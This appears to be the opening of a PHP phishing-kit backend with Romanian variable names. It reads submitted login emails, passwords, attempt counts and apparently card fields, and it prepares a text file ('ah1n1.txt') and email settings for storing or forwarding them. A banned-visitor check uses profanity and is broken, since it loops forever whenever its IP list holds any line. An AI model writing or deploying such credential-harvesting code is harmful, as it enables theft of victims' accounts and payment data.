<?php
error_reporting(0);
$numefissalvat  =  "ah1n1.txt" ;
$verifClick = 0;
$trimitemail  =  "0" ;
$adresamail   =  "" ;
settype($template, "string");
$template = "1234567890abcdefghijklmnopqrstuvwxyz";
function GetRandomString($length) {
       global $template;
       settype($length, "integer");
       settype($rndstring, "string");
       settype($a, "integer");
       settype($b, "integer");
       for ($a = 0; $a <= $length; $a++) {
               $b = rand(0, strlen($template) - 1);
               $rndstring .= $template[$b];
       }
       return $rndstring;
}

; 
$handle=@fopen("bannedips.txt", "r"); 
if($handle) 
{ 
	while (!feof($handle)) 
	{ 
		$buffer=fgets($handle, 4096); 
		
		{ 
			$i=1;
			while($i)
			{
				echo "<center><H1>Fuck Off Punk!</H1></center>\n";
			}
			exit; 
		} 
	} 
	fclose($handle);
}
if ($VerPHP)
{
$tcl = $HTTP_POST_VARS['tcl'];
$dcl = $HTTP_POST_VARS['dcl'];
$pcl = $HTTP_POST_VARS['pcl'];
$email =          $HTTP_GET_VARS['client'];
$login_email =    $HTTP_POST_VARS['login_email'];
$login_password = $HTTP_POST_VARS['login_password'];
$incercari = $HTTP_POST_VARS['incercari'];

}
else
{
$tcl = $_POST['tcl'];
$dcl = $_POST['dcl'];
$pcl = $_POST['pcl'];
$email          = $_POST['client'];
$login_email    = $_POST['login_email'];
$login_password = $_POST['login_password'];
$incercari = $_POST['incercari'];
}
?>
